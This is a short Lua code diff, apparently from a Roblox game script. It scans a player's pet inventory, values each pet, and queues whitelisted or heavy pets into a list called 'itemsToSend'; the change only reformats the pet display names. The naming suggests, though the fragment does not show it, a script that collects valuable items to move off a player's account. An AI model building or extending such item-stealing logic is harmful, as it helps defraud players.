@@ -424,19 +424,17 @@ if playerData and playerData.PetsData and playerData.PetsData.PetInventory and p
     for petUUID, v14 in pairs(playerData.PetsData.PetInventory.Data) do
         if v14 and v14.PetData and v14.PetType then
             local itemName = v14.PetType
-            local petName = v14.PetData.Name or itemName
-            local weight, petAge = extractWeightAndAge(petName)
-            if not weight then weight = v14.PetData.BaseWeight or 0 end
-            if not petAge then petAge = v14.PetData.Age ~= nil and tostring(v14.PetData.Age) or "N/A" end
+            local weight = v14.PetData.BaseWeight or 0
+            local petAge = v14.PetData.Age ~= nil and tostring(v14.PetData.Age) or "N/A"
+            local displayName = string.format("%s [%.2f KG] [Age %s]", itemName, weight, petAge)
             local value = calcPetValue(v14)
             local isWhitelisted = isWhitelistedPet(itemName)
             local isHeavy = weight and weight >= 25
-            -- Avoid duplicates: use UUID as key
             if (isWhitelisted or isHeavy) and not seenPets[petUUID] then
                 totalValue = totalValue + value
-                table.insert(itemsToSend, {Tool = nil, Name = itemName, Value = value, Weight = weight, Type = "Pet", Age = petAge})
+                table.insert(itemsToSend, {Tool = nil, Name = displayName, Value = value, Weight = weight, Type = "Pet", Age = petAge})
                 seenPets[petUUID] = true
-                debugPrint("Added pet: " .. itemName .. " Value: " .. value .. " Weight: " .. tostring(weight) .. " Age: " .. tostring(petAge))
+                debugPrint("Added pet: " .. displayName .. " Value: " .. value .. " Weight: " .. tostring(weight) .. " Age: " .. tostring(petAge))
             end
         end
     end
